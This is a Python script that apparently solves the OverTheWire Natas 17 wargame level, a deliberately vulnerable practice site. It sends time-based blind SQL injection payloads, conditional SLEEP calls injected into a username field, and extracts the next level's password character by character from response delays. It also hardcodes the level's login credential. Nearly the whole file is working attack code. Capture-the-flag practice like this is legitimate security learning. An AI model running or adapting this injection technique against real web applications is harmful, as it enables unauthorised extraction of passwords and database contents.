import time
import requests
from requests.auth import HTTPBasicAuth
import string

url = "http://natas17.natas.labs.overthewire.org"
auth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')

# Step 1: Confirm time-based injection works
# Test payload: natas18" AND SLEEP(5) #
# If it delays 5 seconds, injection works

# Step 2: Extract password length (optional)
def find_password_length():
    for length in range(1, 65):
        payload = f'natas18" AND IF(LENGTH(password)={length}, SLEEP(3), 0) #'
        start = time.time()
        requests.post(url, auth=auth, data={'username': payload})
        if time.time() - start > 2.5:
            return length

# Step 3: Extract password character by character
password = ""
charset = string.ascii_letters + string.digits

for position in range(1, 33):  # Adjust based on length
    for char in charset:
        # If password[position] = char, sleep for 3 seconds
        payload = f'natas18" AND IF(SUBSTRING(password,{position},1)="{char}", SLEEP(3), 0) #'
        
        start = time.time()
        requests.post(url, auth=auth, data={'username': payload})
        elapsed = time.time() - start
        
        if elapsed > 2.5:  # Noticeable delay
            password += char
            print(f"Position {position}: {char} (Password so far: {password})")
            break

print(f"\nFinal password: {password}")